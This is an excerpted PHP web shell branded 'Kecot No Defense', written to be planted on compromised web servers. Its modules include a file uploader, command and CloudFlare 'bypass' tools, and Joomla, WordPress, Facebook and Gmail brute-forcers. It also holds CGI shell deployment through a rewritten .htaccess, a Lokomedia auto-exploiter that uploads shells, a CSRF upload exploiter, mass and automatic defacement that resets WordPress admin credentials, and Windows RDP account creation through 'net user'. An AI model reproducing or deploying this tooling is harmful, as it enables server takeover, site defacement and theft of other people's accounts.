...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp">
<title>xXx::.Kecot No Defense.::xXx/title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="Kecot No Defense"src="https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>Tn_wizyakuza</span><br><br>
<span class="style4">Kecot No Defense: <br>SQL47.ID</span><br><br>
<span class="style4">Official Member: <br>Tn_wizyakuza - UNO - LEMMER404 </span><br><br>
<span class="style4">Greetz : <br> Obitron </span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">Kecot No Defense Bypass</font><br><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@Kecot No Defense :~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@Kecot No Defense :~$</font> Connected ! </font><br>
...
<font color="red">root@Kecot No Defense :~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<head>
	<link rel="SHORTCUT ICON" href="https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp">
<title>xXx::. Hacked By Kecot .::xXxx</title>
<meta name='author' content='LEMMER404'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ Kecot No Defense  Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
//Fungsi log dinonaktifkan oleh Kecot No Defense 
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By Kecot No Defense  ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By Kecot No Defense  ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By LEMMER404 ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
	...
	<meta name="author" content="https://i.ibb.co/gwYm9cz/STK-20230715-WA0029.webp" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="LEMMER404" />
<center>
</br></br>
<center><b><font color="lime">+--=[ HECKER BY LEMMER404 ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By Kecot No Defense  ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by Kecot No Defense  ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by Kecot No Defense || Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : Kecot No Defense <br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : Kecot No Defense </font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by Kecot No Defense  ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce Kecot No Defense </span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Kecot No Defense '><br>POST CONTENT: <input type='text' name='content' value='Hacked By Kecot No Defense '><br>POSTNAME: <input type='text' name='postname' value='HackeD By Kecot No Defense '><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.Kecot No Defense ";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Kecot No Defense  \n AddHandler cgi-script .Index_Kecot No Defense  \n AddHandler cgi-script .Index_Kecot No Defense ";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.Kecot No Defense ' target='_blank'>Klik Here</a>";
}
...
elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.Kecot No Defense ";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Kecot No Defense  \n AddHandler cgi-script .Kecot No Defense  \n AddHandler cgi-script .Kecot No Defense ";
	$htcgi = fopen(".htaccess", "w");
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.Kecot No Defense ' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi2.Kecot No Defense ";
        $memeg = ".htaccess";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.Kecot No Defense ' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "Kecot No Defense  Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
echo '<form action="?dir=$dir&do=logout" method="post">';
	...
	<font color='white'>4ever only email no Instagram , Twitter , Facebook , And Other <br>Email : LEMMER40</font><br></tr></td></table></center>";
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Kecot No Defense , &amp; Recoded by Kecot No Defense </font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By LEMMER404<br>Recoded by Kecot No Defense </h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Kecot No Defense </textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Kecot No Defense '><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' Kecot No Defense '><br>
		<u>Domains</u>: <br>
...
$data_to_post = array();
$data_to_post['Kecot No Defense '] = "$hekel";
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Kecot No Defense ' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Kecot No Defense ' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Kecot No Defense ' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Kecot No Defense '><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		$user = "Kecot No Defense ";
		$pass = "Kecot No Defense ";
		$passx = md5($pass);
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Kecot No Defense ' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user Kecot No Defense ");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Kecot No Defense </font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Kecot No Defense ' required>
			<input type='text' name='pass' placeholder='password' value='Kecot No Defense ' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'> Shell By Kecot No Defense ";
	}
?> 
